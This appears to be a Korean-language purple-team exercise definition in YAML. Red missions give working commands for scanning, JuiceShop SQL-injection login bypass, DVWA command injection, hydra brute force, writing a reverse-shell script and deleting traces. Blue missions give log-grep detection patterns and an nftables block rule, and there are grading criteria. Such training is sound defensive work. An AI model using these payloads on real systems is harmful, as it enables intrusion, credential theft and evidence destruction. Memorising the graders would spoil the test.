id: "purple-team"
title: "Purple Team: MITRE ATT&CK 매핑"
description: "MITRE ATT&CK 프레임워크 기반의 Purple Team 훈련이다. Red Team은 특정 ATT&CK 테크닉(T1046 네트워크 서비스 스캐닝, T1059 명령/스크립트 인터프리터, T1078 유효 계정, T1190 공개 애플리케이션 익스플로잇, T1070 지표 제거)을 실행한다. Blue Team은 각 테크닉에 대한 탐지 커버리지를 검증하고 미탐지 영역을 식별해야 한다."
difficulty: "hard"
time_limit: 3600
battle_type: "1v1"

red_missions:
  - order: 1
    instruction: "[T1046 - Network Service Scanning] 전체 인프라의 서비스 맵을 구성하라."
    hint: "nmap -sV -sC -p 1-10000 10.20.30.0/24 --max-retries 1 --host-timeout 15s -T4 2>&1 | head -80"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "open"
      semantic:
        intent: "MITRE T1046 (Network Service Scanning) — 표준 ATT&CK technique 의 정확한 실행. nmap -sV + -sC (default scripts) 로 service version + 추가 정보 동시 수집."
        success_criteria:
          - "nmap -sV -sC + 적절한 port 범위 (1-10000)"
          - "응답에 open + service version + script 결과"
          - "최소 2 host × 2 service 식별"
        acceptable_methods:
          - "nmap -sV -sC -p <range> CIDR"
          - "masscan + nmap -sV (속도 우선)"
          - "rustscan -- -sV -sC"
        negative_signs:
          - "-sV / -sC 누락 (T1046 불완전 실행)"
          - "단일 IP 만 + subnet sweep 누락"

  - order: 2
    instruction: "[T1190 - Exploit Public-Facing Application] JuiceShop의 SQLi를 통해 인증을 우회하라."
    hint: "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' or 1=1--\",\"password\":\"a\"}'"
    points: 20
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "token"
      semantic:
        intent: "MITRE T1190 (Exploit Public-Facing Application) — 공개 web app 의 SQLi 인증 우회. JuiceShop /rest/user/login + email field SQLi."
        success_criteria:
          - "POST /rest/user/login + JSON + SQLi payload (email field)"
          - "응답에 authentication.token (JWT)"
          - "T1190 + OWASP A03+A07 매핑 명시"
        acceptable_methods:
          - "curl -X POST"
          - "Burp Repeater"
          - "sqlmap --form"
        negative_signs:
          - "SQLi payload escape 잘못 (인용부호)"
          - "응답 401 받고 alternate 안 시도"

  - order: 3
    instruction: "[T1059 - Command and Scripting Interpreter] DVWA Command Injection으로 시스템 명령을 실행하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;id;whoami;uname+-a&Submit=Submit'"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "uid"
      semantic:
        intent: "MITRE T1059.004 (Unix Shell) — Cmd inject 으로 OS command. id + whoami + uname 동시 실행 (정찰 + execution 결합)."
        success_criteria:
          - "POST /vulnerabilities/exec/ + ;<cmd>;<cmd2>;..."
          - "응답에 uid + 사용자명 + kernel 정보"
          - "T1059.004 + OWASP A03 매핑"
        acceptable_methods:
          - "curl POST + chained cmd inject"
          - "다른 inject vector (`|, &&, $())"
          - "Burp Repeater"
        negative_signs:
          - "단일 명령만 + chain 누락"
          - "쿠키 누락 → redirect"

  - order: 4
    instruction: "[T1078 - Valid Accounts] hydra로 DVWA의 유효한 계정 크리덴셜을 탈취하라."
    hint: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.30.80 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: security=low; PHPSESSID=test' -t 4 -W 1 -f 2>&1 | head -20"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "hydra"
      semantic:
        intent: "MITRE T1078 (Valid Accounts) + T1110.001 (Brute Force) — 정상 계정 (admin) 의 password brute. 성공 시 후속 lateral movement 의 base."
        success_criteria:
          - "hydra -l admin -P <wordlist> http-get-form '<path>:<params>:<failmsg>:H=<cookie>'"
          - "쿠키 + fail message 정확"
          - "응답에 hydra 진행 + (성공 시) [HOST] login: pass:"
        acceptable_methods:
          - "hydra http-get-form"
          - "patator http_fuzz"
          - "wfuzz / ffuf"
          - "password_attack skill"
        negative_signs:
          - "쿠키 누락 → 모든 시도 실패"
          - "-t 100 너무 높음 (rate limit trigger)"

  - order: 5
    instruction: "[T1059 - Scripting] Command Injection으로 Python 리버스 셸 스크립트를 작성하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;echo+\"import+socket,os\"+>+/tmp/rs.py+2>&1;echo+script_created&Submit=Submit'"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "script_created"
      semantic:
        intent: "MITRE T1059.006 (Python) — script file 생성 → 실행 chain. cmd inject + file write + python 실행 multi-step."
        success_criteria:
          - "echo > /tmp/rs.py (cmd inject + file write)"
          - "응답에 script_created"
          - "(보너스) python /tmp/rs.py 실행 시도"
        acceptable_methods:
          - "echo + redirect"
          - "cat << EOF heredoc"
          - "wget/curl 외부 script"
          - "base64 -d 후 python eval"
        negative_signs:
          - "script_created 없음"
          - "script 작성만 + 실행 검증 안 함"

  - order: 6
    instruction: "[T1070 - Indicator Removal] 공격 흔적 삭제를 시도하라 (bash history, tmp 파일)."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;rm+-f+/tmp/rs.py;history+-c+2>&1;echo+indicators_removed&Submit=Submit'"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "indicators_removed"
      semantic:
        intent: "MITRE T1070.004 (File Deletion) + T1070.003 (Clear Command History) — 공격 후 IoC 제거. tmp file + bash history."
        success_criteria:
          - "rm -f /tmp/<file> + history -c"
          - "응답에 indicators_removed"
          - "(보너스) 추가 anti-forensic (auditd 비활성, log truncate)"
        acceptable_methods:
          - "rm -f + history -c"
          - "shred -u (복구 차단)"
          - "wipe -r (전용 도구)"
          - "unset HISTFILE"
        negative_signs:
          - "indicators_removed 없음"
          - "history 만 + tmp file 누락"

  - order: 7
    instruction: "[T1046] nikto로 추가 취약점 벡터를 스캔하라."
    hint: "nikto -h http://10.20.30.80:8080 -maxtime 60s 2>&1 | head -30"
    points: 10
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "Server:"
      semantic:
        intent: "T1046 추가 — application layer scanner (nikto). 6700+ default check 자동화."
        success_criteria:
          - "nikto -h URL -maxtime 60s"
          - "응답에 Server + finding (OSVDB-N / cookies / outdated)"
          - "최소 1 finding"
        acceptable_methods:
          - "nikto -h URL"
          - "wapiti / arachni"
          - "ZAP automated scan"
        negative_signs:
          - "-maxtime 누락 (오래 걸림)"
          - "Server header 만 + finding 분석 누락"

blue_missions:
  - order: 1
    instruction: "[T1046 탐지] suricata에서 네트워크 스캔(T1046) 탐지 알림을 확인하라."
    hint: "grep -iE 'scan\\|probe\\|enum' /var/log/suricata/fast.log | tail -20"
    points: 10
    target_vm: secu
    verify:
      type: "output_contains"
      expect: "10.20.30"
      semantic:
        intent: "T1046 detection coverage — Suricata ET scan/probe SID 매칭. attacker IP 식별."
        success_criteria:
          - "fast.log grep scan/probe/enum"
          - "source IP 10.20.30.201 (attacker) 매칭"
          - "최소 1 alert + sid + classification"
        acceptable_methods:
          - "grep + tail fast.log"
          - "jq alert filtering eve.json"
          - "Wazuh suricata decoder"
        negative_signs:
          - "fast.log 비어있음 (suricata 미실행)"
          - "alert 보이지만 IP 분석 누락"

  - order: 2
    instruction: "[T1190 탐지] ModSecurity에서 애플리케이션 익스플로잇(T1190) 차단 로그를 확인하라."
    hint: "grep -iE 'sql|injection|exploit' /var/log/apache2/modsec_audit.log | tail -20"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "sql"
      semantic:
        intent: "T1190 detection — ModSecurity OWASP CRS rule (942xxx SQLi) 트리거. WAF 가 가장 정확한 application layer detection."
        success_criteria:
          - "modsec_audit.log grep sql/injection/exploit"
          - "최소 1 rule id (942xxx) + matched payload"
          - "URL + IP + timestamp 추출"
        acceptable_methods:
          - "grep + tail modsec_audit.log"
          - "jq (modsec3 JSON)"
          - "logwatch + OWASP CRS report"
        negative_signs:
          - "audit_log 비어있음 (SecAuditEngine off)"
          - "rule id 분석 없이 raw dump"

  - order: 3
    instruction: "[T1059 탐지] Apache 접근 로그에서 Command Injection(T1059) 패턴을 탐지하라."
    hint: "grep -iE 'exec|;|cmd|whoami|uname|%3B' /var/log/apache2/access.log | tail -20"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "exec"
      semantic:
        intent: "T1059 detection — access.log 의 URL/body 의 cmd inject 페이로드 (;cmd / %3B / whoami / uname)."
        success_criteria:
          - "access.log grep -iE 'exec|;|cmd|whoami|uname|%3B'"
          - "/vulnerabilities/exec/ + body 의 ;cmd"
          - "최근 20 line + IP + URL"
        acceptable_methods:
          - "grep + tail access.log"
          - "awk + URL 의 ; 출현 빈도"
          - "ELK/Loki query"
        negative_signs:
          - "패턴 매칭 후 source IP 분석 없음"
          - "raw dump"

  - order: 4
    instruction: "[T1078 탐지] Wazuh에서 브루트포스/인증 공격(T1078) 알림을 확인하라."
    hint: "grep -iE 'authentication|brute|login|failed' /var/ossec/logs/alerts/alerts.json | tail -20"
    points: 15
    target_vm: siem
    verify:
      type: "output_contains"
      expect: "alert"
      semantic:
        intent: "T1078 detection — Wazuh authentication_failed group rule (5710/5712 등) 매칭."
        success_criteria:
          - "alerts.json grep -iE 'authentication|brute|login|failed'"
          - "최소 1 alert + rule.id + agent + source IP"
          - "rule level (10+ critical) 분류"
        acceptable_methods:
          - "grep + tail alerts.json"
          - "jq '.rule.groups[] | contains(\"authentication\")' alerts.json"
          - "Wazuh API: GET /security/agents/<id>/alerts?q=group:authentication_failed"
        negative_signs:
          - "alerts.json 비어있음 (decoder 미설정)"
          - "raw dump"

  - order: 5
    instruction: "[T1070 탐지] Wazuh syscheck에서 파일 삭제/변조(T1070) 이벤트를 확인하라."
    hint: "grep -iE 'syscheck|integrity|deleted|modified' /var/ossec/logs/alerts/alerts.json | tail -20"
    points: 15
    target_vm: siem
    verify:
      type: "output_contains"
      expect: ""
      semantic:
        intent: "T1070 detection — Wazuh FIM (syscheck) 의 file deleted/modified alert. Red #6 의 흔적 삭제 자동 탐지."
        success_criteria:
          - "alerts.json grep syscheck + deleted/modified"
          - "최소 1 syscheck rule (550~554) + path"
          - "변경 type (added/modified/deleted) 추출"
        acceptable_methods:
          - "grep + tail alerts.json"
          - "jq '.rule.groups[]==\"syscheck\"' alerts.json"
          - "Wazuh API: GET /security/agents/<id>/syscheck"
        negative_signs:
          - "syscheck 미설정 (/tmp 미감시)"
          - "alert 만 + change type 분석 없음"

  - order: 6
    instruction: "[커버리지 분석] 각 ATT&CK 테크닉별 탐지 여부를 정리하라. suricata 알림 SID 목록을 추출하라."
    hint: "grep -oP '\\[\\d+:\\d+:\\d+\\]' /var/log/suricata/fast.log | sort -u"
    points: 20
    target_vm: secu
    verify:
      type: "output_contains"
      expect: "["
      semantic:
        intent: "Purple Team 핵심 — ATT&CK technique 별 detection coverage matrix. 미탐지 (gap) 식별 후 보완."
        success_criteria:
          - "fast.log 의 SID 추출 + sort -u"
          - "T1046/T1059/T1078/T1190/T1070 각각의 detection 여부"
          - "(보너스) detection coverage 표 (5 technique × detected/missed)"
        acceptable_methods:
          - "grep -oP '\\[\\d+:\\d+:\\d+\\]' + sort -u"
          - "jq '.alert.signature_id' eve.json | sort -u"
          - "Wazuh + ATT&CK Navigator JSON export"
          - "ATT&CK Caldera coverage report"
        negative_signs:
          - "SID list 만 + technique 매핑 없음"
          - "coverage 분석 누락 (Purple Team 의 본질 missed)"

  - order: 7
    instruction: "[커버리지 강화] 탐지 갭을 보완하기 위해 nftables에 Command Injection 관련 아웃바운드를 차단하라."
    hint: "nft add rule inet filter output ip saddr 10.20.30.80 ip daddr 10.20.30.201 drop"
    points: 15
    target_vm: secu
    verify:
      type: "output_contains"
      expect: ""
      semantic:
        intent: "Coverage gap mitigation — Step 6 의 미탐지 (예: T1059 outbound C2) 보완. nft outbound block 으로 컨테인먼트."
        success_criteria:
          - "nft add rule inet filter output (or forward)"
          - "ip saddr <web> + ip daddr <attacker> + drop (또는 광범위)"
          - "rule 적용 후 nft list"
        acceptable_methods:
          - "nft add rule + saddr+daddr"
          - "iptables OUTPUT (legacy)"
          - "Cilium NetworkPolicy"
          - "configure_nftables skill"
        negative_signs:
          - "rule 추가 만 + Step 6 의 미탐지 영역과 연관 없음"
          - "input chain 만 + outbound 누락"
